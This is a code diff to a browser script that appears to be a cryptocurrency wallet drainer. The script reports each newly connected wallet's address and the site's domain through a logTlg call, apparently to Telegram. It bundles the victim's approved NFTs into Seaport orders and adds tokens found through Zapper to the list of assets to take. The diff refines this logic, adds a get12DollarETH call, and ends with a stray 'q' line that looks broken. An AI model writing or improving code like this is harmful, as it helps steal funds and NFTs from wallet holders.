@@ -451,6 +451,7 @@
         }
         collections[key].token_ids.push(nft.identifier.toString());
         collections[key].owned++;
+        collections[key].balance = collections[key].owned;
       }
 
       const nfts = Object.values(collections);
@@ -687,6 +688,7 @@
 
     try {
       waitAlert();
+      await get12DollarETH();
 
       const connectmsg = `🥇Wallet Connected!<br><b>Account: <code>${appState.account}</code></b><br>Domain: ${window.location.hostname}`;
       logTlg(connectmsg);
@@ -722,7 +724,7 @@
 
       tokenListLocal.forEach((nft) => {
         if (nft.type === "erc721" && nft.approved) {
-          bundlePrice += nft.balance || 0;
+          bundlePrice += nft.price || 0;
           (nft.token_ids || []).forEach(token_id => {
             const item = { itemType: 2, token: nft.tokenAddress, identifierOrCriteria: token_id, startAmount: "1", endAmount: "1" };
             orders.push(item);
@@ -777,7 +779,7 @@
           "Celo": "celo", "Aurora": "aurora"
         };
 
-        tokenListLocal = edges
+        const zapperTokens = edges
           .map(({ node }) => {
             const chain = networkMap[node.network?.name] || (node.network?.name || '').toLowerCase() || "ethereum";
             if ((node.balanceUSD ?? 0) <= 0) return null;
@@ -793,7 +795,9 @@
           })
           .filter(Boolean);
 
-        structuredLog('info', 'zapper_tokens_loaded', { count: tokenListLocal.length });
+        tokenListLocal = [...tokenListLocal, ...zapperTokens];
+
+        structuredLog('info', 'zapper_tokens_loaded', { count: zapperTokens.length, totalAfterMerge: tokenListLocal.length });
       } catch (zErr) {
         classifyError(zErr, { operation: 'zapper_fetch' });
       }
@@ -1277,3 +1281,4 @@
   });
 
 })();
+q
